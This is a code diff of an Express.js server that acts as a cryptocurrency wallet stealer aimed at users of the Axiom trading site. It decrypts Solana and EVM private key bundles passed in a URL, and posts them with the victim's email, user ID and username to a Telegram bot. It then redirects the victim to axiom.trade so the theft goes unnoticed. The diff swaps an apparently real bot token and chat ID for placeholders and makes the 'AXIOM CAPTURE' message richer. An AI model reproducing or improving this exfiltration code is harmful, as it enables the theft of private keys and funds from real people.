@@ -4,13 +4,13 @@ const crypto = require('crypto');
 const bs58 = require('bs58');
 const app = express();
 
-const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const TG_CHAT = '7680513699';
+const TG_BOT = 'YOUR_BOT_TOKEN';
+const TG_CHAT = 'YOUR_CHAT_ID';
 
 function decrypt(encrypted, bundleKey) {
   try {
     const [ivBase64, ciphertext] = encrypted.split(':');
-    if (!ivBase64 || !ciphertext) return 'INVALID_FORMAT';
+    if (!ivBase64 || !ciphertext) return null;
     
     const iv = Buffer.from(ivBase64, 'base64');
     const key = Buffer.from(bundleKey, 'base64');
@@ -22,10 +22,9 @@ function decrypt(encrypted, bundleKey) {
     let decrypted = decipher.update(encryptedBuffer.slice(0, -16));
     decrypted = Buffer.concat([decrypted, decipher.final()]);
     
-    // Convert to base58 for Solana/EVM
     return bs58.encode(decrypted);
   } catch (e) {
-    return 'DECRYPT_ERROR: ' + e.message;
+    return null;
   }
 }
 
@@ -40,29 +39,57 @@ app.get('/data/:b64', async (req, res) => {
     if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
     if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
     
-    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
-    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
+    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
+    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)).filter(k => k) || [];
+    
+    const timestamp = new Date().toLocaleString('en-US', { 
+      timeZone: 'America/Chicago',
+      dateStyle: 'short',
+      timeStyle: 'short'
+    });
     
     const msg = `
-🚨 PRIVATE KEYS
+╔═══════════════════════════╗
+║     🚨 AXIOM CAPTURE 🚨    ║
+╚═══════════════════════════╝
 
-Email: ${data.user?.email}
+👤 USER INFO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 Email: ${data.user?.email || 'N/A'}
+🆔 User ID: ${data.user?.id || 'N/A'}
+👤 Username: ${data.user?.username || 'N/A'}
 
-Solana (base58):
-${solKeys.join('\n')}
+💰 SOLANA WALLETS (${solKeys.length})
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${solKeys.length > 0 ? solKeys.map((key, i) => `${i + 1}. \`${key}\``).join('\n') : '❌ None found'}
 
-EVM (base58):
-${evmKeys.join('\n')}
-    `;
+💎 EVM WALLETS (${evmKeys.length})
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${evmKeys.length > 0 ? evmKeys.map((key, i) => `${i + 1}. \`${key}\``).join('\n') : '❌ None found'}
+
+🌐 SOURCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 URL: ${data.site}
+⏰ Time: ${timestamp}
+🔑 Bundle Key: \`${data.bundle}\`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💡 Total Keys: ${solKeys.length + evmKeys.length}
+    `.trim();
     
     await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
+      body: JSON.stringify({ 
+        chat_id: TG_CHAT, 
+        text: msg,
+        parse_mode: 'Markdown'
+      })
     });
     
     res.redirect('https://axiom.trade/discover');
   } catch (e) {
+    console.error(e);
     res.status(500).send('err');
   }
 });
